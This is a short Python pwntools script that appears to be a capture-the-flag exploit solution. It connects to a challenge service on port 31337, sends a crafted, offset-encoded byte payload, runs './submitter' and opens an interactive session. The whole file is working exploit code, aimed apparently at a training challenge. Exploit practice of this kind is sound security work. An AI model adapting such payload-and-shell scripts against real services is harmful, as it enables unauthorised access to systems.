#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process("../handout/challenge.py")
code = b'\x00\x00\x00\x00\x01\x00\x11\x11\x11\x11'
code += b'\x04fUzZ\x00tHiS'
code += bytes([c+1 for c in b"\x10\x55\x55\x55\x55\x55\x55\x55\x00\x00"])
code += bytes([c+2 for c in b"@\x00\x00\x001337\x00\x00"])
code += bytes([(c+3) & 0xFF for c in b"\x80\xFF\xFF\xFF\xFF\x01\x00\x00\x00\x00"])
io.recvuntil(b"...")
io.sendline((code*100)[:1000])
io.sendline("./submitter")
io.interactive()
